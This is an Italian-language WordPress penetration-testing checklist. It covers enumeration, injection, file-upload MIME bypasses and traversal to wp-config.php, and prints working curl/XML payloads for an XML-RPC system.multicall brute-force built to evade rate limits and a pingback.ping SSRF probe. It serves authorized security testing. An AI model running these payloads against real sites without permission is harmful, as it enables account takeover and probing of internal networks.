## Checklist PT WordPress 
1) Information Gathering

Identifica versione di WordPress:
curl -I https://target/wp-login.php oppure plugin enumeration.

Scansione directory comuni:
/wp-admin/, /wp-content/uploads/, /wp-json/, /xmlrpc.php

Enumerazione utenti:

/wp-json/wp/v2/users

/?author=1, /?author=2

Tecnologia lato server: whatweb, wappalyzer.

2) Plugin & Theme Enumeration

wpscan --url target --enumerate p,t,u

Controlla:

plugin non aggiornati

versioni vulnerabili

temi premium con vulnerabilità note

Cerca exploit pubblici: ExploitDB, nvd.nist.gov, WPScan DB.

3) WordPress Core Vulnerabilities

Test standard:

XML-RPC brute or pingback abuse
/xmlrpc.php → test system.multicall

Default credentials (admin/admin ecc.)

Directory Listing in
/wp-content/uploads/
/wp-includes/

4) REST API Misconfigurations

Enumerazione utenti via /wp-json/wp/v2/users

Accesso non autorizzato ai contenuti:
/wp-json/wp/v2/posts/
/wp-json/wp/v2/pages/

Verificare API custom di temi/plugin.

5) Injection (XSS, SQLi, File Upload)
XSS

Form di contatto

Commenti (se attivi)

Campi search

Shortcode non sanitizzati

SQL Injection

WordPress core è in genere sicuro → test sui plugin:

Campi dei form

Parametri AJAX: /wp-admin/admin-ajax.php

API custom

File Upload

controlla upload in contatto, custom form, builder

bypass MIME: .php.jpg, .phtml, .php%00.jpg

verifica se i file sono eseguibili in /uploads/...

6) Weak Authentication

Login brute-force (in test va bene):
/wp-login.php con wpscan --passwords rockyou.txt

Verifica:

rate-limit assente

2FA non presente

errori di login troppo verbosi

7) Authorization & Privilege Escalation

Testa utenti “editor”, “author”, “subscriber”.

Verifica se possono:

Uploadare file PHP

Accedere a /wp-admin/*

Usare /admin-ajax.php con actions non protette.

8) Configuration Flaws

wp-config.php accessibile?

Debug mode attivo (WP_DEBUG true)

Backup scaricabili: wp-config.php.bak, .zip, .old.

9) Server-side Tests

Directory traversal nei plugin:
../wp-config.php

SSRF via:

plugin di import/export

HTTP calls interne (curl).


## XMLRPC.PHP

```
curl -X POST https://target/xmlrpc.php -d '<methodCall><methodName>demo.sayHello</methodName></methodCall>'
```

**Brute Force via system.multicall (Attacco potente)**

È la cosa più interessante da testare.

system.multicall permette di inviare decine/centinaia di tentativi di login in un’unica richiesta, bypassando facilmente rate limit e protezioni basic.

Esempio PoC:

```
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>
                          <array>
                            <data>
                              <value>admin</value>
                              <value>password1</value>
                            </data>
                          </array>
                        </value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <!-- aggiungi altre password qui -->
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```


Se un tentativo ha successo, WordPress ritorna le info del blog.

**Pingback enabled → SSRF / DoS**

Se il sito permette il metodo pingback.ping, puoi testare:

A) SSRF (Server Side Request Forgery)

Permette di far fare al server richieste verso URL interni.

Test:

```
curl -X POST https://target/xmlrpc.php \
-d '<methodCall><methodName>pingback.ping</methodName>
<params>
  <param><value>http://google.com</value></param>
  <param><value>http://127.0.0.1:80/</value></param>
</params></methodCall>'
```

Se il server risponde con errori specifici → SSRF fattibile.
